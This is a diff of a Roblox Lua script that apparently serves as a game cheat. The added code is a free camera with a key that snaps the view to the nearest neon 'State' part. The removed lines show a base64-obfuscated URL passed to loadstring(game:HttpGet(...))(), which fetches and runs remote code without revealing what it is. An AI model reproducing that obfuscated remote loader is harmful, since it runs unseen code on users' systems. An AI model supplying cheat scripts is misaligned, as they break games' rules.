@@ -1,26 +1,73 @@
-local base64 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
+local a = game:GetService("UserInputService")
+local b = game:GetService("RunService")
+local c = workspace.CurrentCamera
+local d = Enum.KeyCode.K
+local e = Enum.KeyCode.Y
+local f = 0.7
+local g
+local i = false
 
-local function decodeBase64(data)
-local decoded = ""
-local padding = #data % 4
-if padding > 0 then
-data = data .. string.rep("=", 4 - padding)
+local function m()
+    local n = a:GetMouseLocation()
+    local o = nil
+    local p = math.huge
+    for _, k in ipairs(workspace:GetDescendants()) do
+        if k:IsA("UnionOperation") and k.Name == "State" and k.Material == Enum.Material.Neon then
+            local r, s = c:WorldToScreenPoint(k.Position)
+            if s then
+                local t = (Vector2.new(r.X, r.Y) - n).Magnitude
+                if t < p then
+                    p = t
+                    o = k
+                end
+            end
+        end
+    end
+    return o
 end
-data = string.gsub(data, ".", function(x)
-if x == "=" then return "" end
-local r, f = "", (string.find(base64, x) - 1)
-for i = 6, 1, -1 do
-r = r .. (math.floor(f / 2^(i-1)) % 2)
+
+local function u()
+    local o = m()
+    if o then
+        c.CFrame = o.CFrame
+        g = o.CFrame
+    end
 end
-return r
+
+local function v()
+    if i then
+        local w = a:GetMouseDelta()
+        g = g * CFrame.Angles(-math.rad(w.Y), -math.rad(w.X), 0)
+        local x = Vector3.new(
+            (a:IsKeyDown(Enum.KeyCode.D) and f or 0) - (a:IsKeyDown(Enum.KeyCode.A) and f or 0),
+            (a:IsKeyDown(Enum.KeyCode.Space) and f or 0) - (a:IsKeyDown(Enum.KeyCode.LeftShift) and f or 0),
+            (a:IsKeyDown(Enum.KeyCode.S) and f or 0) - (a:IsKeyDown(Enum.KeyCode.W) and f or 0)
+        )
+        g = g * CFrame.new(x)
+        c.CFrame = g
+    end
+end
+
+local function y()
+    i = not i
+    if i then
+        g = c.CFrame
+    else
+        local z = game.Players.LocalPlayer
+        if z and z.Character and z.Character:FindFirstChild("HumanoidRootPart") then
+            c.CFrame = z.Character.HumanoidRootPart.CFrame
+        end
+    end
+end
+
+a.InputBegan:Connect(function(A, B)
+    if not B then
+        if A.KeyCode == d then
+            y()
+        end
+        if A.KeyCode == e then
+            u()
+        end
+    end
 end)
-for i = 1, #data, 8 do
-decoded = decoded .. string.char(tonumber(string.sub(data, i, i+7), 2))
-end
-return decoded
-end
-
-local encodedUrl = "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL05vdEg0eG9yLy0vbWFpbi8lMkM="
-local decodedUrl = decodeBase64(encodedUrl)
-
-loadstring(game:HttpGet(decodedUrl))()
+b.RenderStepped:Connect(v)
